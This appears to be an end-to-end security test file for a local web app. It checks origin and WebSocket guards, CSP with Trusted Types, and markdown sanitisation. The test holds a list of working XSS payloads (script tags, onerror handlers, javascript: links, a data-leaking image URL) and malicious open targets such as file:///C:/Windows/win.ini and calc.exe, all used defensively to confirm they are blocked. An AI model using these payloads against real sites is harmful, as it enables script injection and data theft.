// SPEC §12.6 security.e2e.ts (WP-D): guard cases from a second origin (127.0.0.1:<other port>) in the installed Edge,
// CSP + Trusted Types enforced on the app page, XSS payloads inert through the single HTML sink (lib/md.js), and the
// `open` command refusing anything but http/https. Uses the fake engine and throwaway dirs only.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import net from 'node:net';
import os from 'node:os';
import type { AddressInfo } from 'node:net';
import { edgeInstalled, startServer, openBrowser } from './harness.ts';
import type { ServerHandle } from './harness.ts';
import type { Browser, BrowserContext } from 'playwright-core';
import { connectWs } from '../helpers/ws-client.ts';

// Browser globals used inside page.evaluate callbacks (the server tsconfig has no DOM lib).
declare const window: Record<string, unknown>;
declare const document: any;
type TrustedHTML = unknown;

/** The page tests need Edge; the network-level tests run without it. */
const NO_EDGE = edgeInstalled() ? false : 'Microsoft Edge is not installed';
let s: ServerHandle;
let browser: Browser;
let context: BrowserContext;
let attacker: http.Server;
let attackerPort = 0;
let token = '';

before(async () => {
  s = await startServer({ fakeEngine: true });
  const c = await connectWs({ port: s.port, boot: s.boot });                   // the boot code → a device token for the tests
  await c.next((m) => m.t === 'hello');
  token = c.deviceToken!;
  await c.close();
  attacker = http.createServer((_req, res) => { res.writeHead(200, { 'Content-Type': 'text/html' }); res.end('<!doctype html><title>attacker</title>'); });
  await new Promise<void>((r) => attacker.listen(0, '127.0.0.1', () => r()));
  attackerPort = (attacker.address() as AddressInfo).port;
  if (!NO_EDGE) ({ browser, context } = await openBrowser(`http://127.0.0.1:${s.port}`));
});
after(async () => {
  await context?.close().catch(() => {});
  await browser?.close().catch(() => {});
  attacker?.close();
  await s?.stop();
  s?.root.dispose();
});

test('second origin (other port): cross-port WebSocket refused even with a stolen token, POST refused, no CORS read', { skip: NO_EDGE }, async () => {
  const page = await context.newPage();
  await page.goto(`http://127.0.0.1:${attackerPort}/`);
  const r = await page.evaluate(async ({ port, token }) => {
    const ws = (protocols: string[]): Promise<string> => new Promise((res) => {
      const w = new WebSocket(`ws://127.0.0.1:${port}/ws`, protocols);
      w.onopen = () => { res('open'); w.close(); };
      w.onerror = () => res('error');
      setTimeout(() => res('timeout'), 3_000);
    });
    const noSecret = await ws(['smc.v1']);
    const stolen = await ws(['smc.v1', `smc.auth.${token}`]);
    let corsRead = 'blocked';
    try { await (await fetch(`http://127.0.0.1:${port}/`)).text(); corsRead = 'read'; } catch { /* CORS */ }
    let post = 'sent';
    try { await fetch(`http://127.0.0.1:${port}/`, { method: 'POST', mode: 'no-cors', body: 'x' }); } catch { post = 'failed'; }
    return { noSecret, stolen, corsRead, post };
  }, { port: s.port, token });
  assert.equal(r.noSecret, 'error');
  assert.equal(r.stolen, 'error', 'exact Origin check: another port is another origin');
  assert.equal(r.corsRead, 'blocked', 'no CORS headers');
  const status = await new Promise<number>((res) => { const q = http.request({ host: '127.0.0.1', port: s.port, method: 'POST', path: '/' }, (x) => { x.resume(); res(x.statusCode ?? 0); }); q.on('error', () => {}); q.end('x'); });
  assert.equal(status, 405);
  await page.close();
});

test('app page: CSP + Trusted Types enforced, XSS payloads inert through lib/md.js', { skip: NO_EDGE }, async () => {
  const page = await context.newPage();
  const resp = await page.goto(`http://127.0.0.1:${s.port}/`);
  assert.match(resp!.headers()['content-security-policy'] ?? '', /require-trusted-types-for 'script'; trusted-types dompurify/);
  const r = await page.evaluate(async () => {
    const w = window as unknown as { __xss?: number };
    let tt = 'assigned';
    try { document.createElement('div').innerHTML = '<b>x</b>'; } catch (e) { tt = (e as Error).name; }
    let inline = 'ran';
    try { const sc = document.createElement('script'); sc.textContent = 'window.__xss = 1'; document.head.append(sc); } catch (e) { inline = (e as Error).name; }
    const { renderMarkdown } = await import('/app/lib/md.js' as string) as { renderMarkdown: (md: string) => TrustedHTML };
    const payloads = [
      '<img src=x onerror="window.__xss=2">', '[a](javascript:window.__xss=3)', '<script>window.__xss=4</script>', '[d](data:text/html,<script>parent.__xss=5</script>)',
      '<iframe src="javascript:parent.__xss=6"></iframe>', '```\n</code></pre><img src=x onerror=window.__xss=7>\n```', '![leak](https://example.com/leak.png?d=SECRET)',
      '<svg><script>window.__xss=8</script></svg>', '<a href="javascript:window.__xss=9">x</a>', '<style>body{display:none}</style>', '<form action="https://x"><button>go</button></form>',
    ];
    const host = document.createElement('div');
    document.body.append(host);
    for (const p of payloads) { const d = document.createElement('div'); d.innerHTML = renderMarkdown(p) as unknown as string; host.append(d); }
    await new Promise((res) => setTimeout(res, 300));
    const imgs = [...host.querySelectorAll('img')].map((i) => i.getAttribute('src'));
    const hrefs = [...host.querySelectorAll('a')].map((a) => a.getAttribute('href'));
    return { tt, inline, xss: w.__xss ?? 0, imgs, hrefs, styles: host.querySelectorAll('[style],style,iframe,form,script').length, ext: host.querySelectorAll('a[data-ext]').length };
  });
  assert.equal(r.tt, 'TypeError', 'raw innerHTML refused by Trusted Types');
  assert.equal(r.inline, 'TypeError', 'script text refused');
  assert.equal(r.xss, 0, 'no payload fired');
  assert.ok(r.imgs.every((src) => src === null || /^(data:|blob:)/.test(src)), `remote images stripped: ${JSON.stringify(r.imgs)}`);
  assert.ok(r.hrefs.every((h) => h === null || /^(https?:|mailto:|#)/.test(h)), `hrefs: ${JSON.stringify(r.hrefs)}`);
  assert.equal(r.styles, 0);
  await page.close();
});

test('S1: bound to 127.0.0.1 only — [::1] and the LAN address refuse the connection; Host localhost → 421', async () => {
  const tryTcp = (host: string): Promise<string> => new Promise((res) => {
    const sock = net.connect({ host, port: s.port, timeout: 2_000 });
    sock.once('connect', () => { sock.destroy(); res('open'); });
    sock.once('timeout', () => { sock.destroy(); res('timeout'); });
    sock.once('error', (e: NodeJS.ErrnoException) => res(e.code ?? 'error'));
  });
  assert.equal(await tryTcp('127.0.0.1'), 'open');
  assert.notEqual(await tryTcp('::1'), 'open', '::1');
  const lans = Object.values(os.networkInterfaces()).flat().filter((i) => i && !i.internal && i.family === 'IPv4').map((i) => i!.address);
  for (const lan of lans.slice(0, 3)) assert.notEqual(await tryTcp(lan), 'open', lan);
  const status = await new Promise<number>((res) => http.get({ host: '127.0.0.1', port: s.port, path: '/', headers: { host: `localhost:${s.port}` } }, (x) => { x.resume(); res(x.statusCode ?? 0); }));
  assert.equal(status, 421, 'localhost is another origin (DNS rebinding guard)');
});

test('`open` refuses non-http(s) URLs and paths outside a chat folder', async () => {
  const c = await connectWs({ port: s.port, token });
  await c.next((m) => m.t === 'hello');
  for (const target of ['javascript:alert(1)', 'file:///C:/Windows/win.ini', 'ms-settings:privacy', 'C:\\Windows\\System32\\calc.exe']) {
    const r = await c.request({ t: 'open', what: 'url', target });
    assert.ok(!r.ok && r.err.code === 'invalid', target);
  }
  const p = await c.request({ t: 'open', what: 'explorer', target: 'C:\\Windows' });
  assert.ok(!p.ok && p.err.code === 'invalid');
  await c.close();
});
